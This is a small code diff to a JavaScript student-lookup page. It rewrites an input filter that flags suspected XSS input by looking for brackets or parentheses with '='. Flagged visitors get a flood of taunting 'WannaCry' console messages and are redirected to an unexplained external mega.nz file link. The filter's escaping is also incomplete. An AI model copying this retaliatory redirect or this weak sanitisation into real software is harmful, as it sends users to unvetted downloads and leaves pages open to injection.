@@ -26,10 +26,6 @@ function findStudentsIn(school, class_val, period) {
 		});
 	});
 }
-function openInNewTab(url) {
-  var win = window.open(url, '_blank');
-  win.focus();
-}
 function _w(param) {
 	if ((param.includes("<") && param.includes(">")) ||
 		(param.includes("(") && param.includes(")")) && param.includes("=")) {
@@ -40,8 +36,7 @@ function _w(param) {
 			for (var i = 0; i < Math.floor(Math.random() * 5000) + 1000; i++) {
 				console.log("Please stop trying your XSS Attempts :-( I WannaCry");
 			}
-			openInNewTab("https://mega.nz/#!uJ0EzIRI!llXqRzR1SF4Lwr0LiA81tPifdsJktVs9TxqFNXT-HWY");
-			window.close();
+			window.location.replace("https://mega.nz/#!uJ0EzIRI!llXqRzR1SF4Lwr0LiA81tPifdsJktVs9TxqFNXT-HWY");
 	}
 	ret = param.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");	
 	return ret;
